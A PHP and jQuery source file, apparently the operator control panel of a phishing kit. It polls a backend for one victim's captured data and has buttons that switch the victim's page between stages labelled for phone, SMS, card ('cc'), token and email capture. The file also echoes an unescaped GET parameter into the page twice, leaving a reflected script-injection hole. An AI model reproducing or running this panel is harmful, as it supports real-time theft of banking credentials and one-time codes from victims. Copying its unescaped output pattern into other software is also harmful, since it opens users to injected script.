<?php
if(!isset($_GET["file"]))
{
    echo "";
    exit;
}
$file = trim($_GET["file"]);

?>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>noasdasd</title>
        
        <style type="text/css">
            td,th
            {
                padding: 10px;
                border: 2px solid black;
            }
            th
            {
                font-size: 20px;
            }
        </style>
        <link href="src/css/loli_manito_panel_style.css" rel="stylesheet" type="text/css"/>
        <script src="../jquery-3.4.1.min.js" type="text/javascript"></script>
        <script>
        $(document).ready(function()
        {
            PaintData = function()
            {
                $.post(
                    "Ajax2.php",
                    {
                        Op:"PaintData",
                        file: $("#file").val().trim()
                    },
                    function(r)
                    {
                        $("#Div1").html(r);
                    }
                );
            }
            
            cambiar_estado = function()
            {
                $.post(
                    "Ajax2.php",
                    {
                        Op:"cambiar_estado",
                        file: $("#file").val().trim(),
                        estado:$("#id_estado").val().trim()
                    },
                    function(raw_response)
                    {
                        console.log(raw_response);
                    }
                );
            }
            
            
            cambiar_correo = function()
            {
                $.post(
                    "Ajax2.php",
                    {
                        Op:"cambiar_correo",
                        file: $("#file").val().trim(),
                        correo:$("#Group2_Valor").val().trim()
                    },
                    function(raw_response)
                    {
                        console.log(raw_response);
                    }
                );
            }
            
            cambiar_nombre = function()
            {
                console.log("cambiar_nombre");
                $.post(
                    "Ajax2.php",
                    {
                        Op:"cambiar_nombre",
                        file: $("#file").val().trim(),
                        nombre:$("#txt_nombre").val().trim()
                    },
                    function(raw_response)
                    {
                        console.log(raw_response);
                    }
                );
            }
            
            

            PaintData();
            aju = setInterval(PaintData, 3000);
        });
        </script>
    </head>
    
</html>
    <body>
        <input type="hidden" id="file" value="<?php echo $file;; ?>" >
        <div id="div0">
            <div id="Div1" style=" float: left; margin-right: 100px; ">
            </div>
            <div id="Div2" style=" float:left; ">

                <table >
                    <tr>
                        <th colspan="3"  >Acciones</th>
                    </tr>
                    <tr>
                        <th>estado</th>
                        <td>
                            <select id="id_estado">
                                <option value="cargando" >cargando</option>
                                <option value="celular" >celular</option>
                                <option value="sms" >sms</option>
                                <option value="cc" >cc</option>
                                <option value="token" >token</option>
                                <option value="correo" >correo</option>
                                <option value="fin" >fin</option>
                            </select>
                        </td>
                        <td><input type="button" value="GoGoGoGoGoGo" onclick="cambiar_estado()" ></td>
                    </tr>
                    <tr>
                        <td>correo</td>
                        <td>
                            <input type="text" id="Group2_Valor"  >
                        </td>
                        <td><input type="button" value="GoGoGoGoGoGo" onclick="cambiar_correo()" ></td>
                    </tr>
                    <tr>
                        <td>Nombre</td>
                        <td>
                            <input type="text" id="txt_nombre"  >
                        </td>
                        <td><input type="button" value="GoGoGoGoGoGo" onclick="cambiar_nombre()" ></td>
                    </tr>
                    <tr>
                        <td>Nombre</td>
                        <td>
                            <input type="text" id="txt_nombre"  >
                        </td>
                        <td><input type="button" value="GoGoGoGoGoGo" onclick="cambiar_nombre()" ></td>
                    </tr>
                </table>
            </div>
            <div id="Div3" style=" float:left; ">
            </div>
            <div style="clear: both;"></div>
            <div>
                <br>
                <?php echo $file;; ?>
            </div>
        </div>
        
    </body>
</html>
